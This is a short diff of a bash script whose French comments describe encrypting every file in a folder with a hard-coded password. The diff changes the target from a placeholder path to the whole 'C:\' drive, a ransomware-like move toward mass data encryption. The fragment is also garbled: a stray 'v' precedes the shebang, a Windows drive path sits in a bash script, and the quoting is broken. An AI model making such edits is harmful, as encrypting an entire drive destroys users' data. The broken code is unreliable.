@@ -2,7 +2,7 @@
 
 v#!/bin/bash
 # Dossier à chiffrer
-folder="/path/to/folder"
+folder="C:\"
 # Clé de chiffrement
 key="my_secret_password_password"
 # Chiffrer tous les fichiers dans le dossier
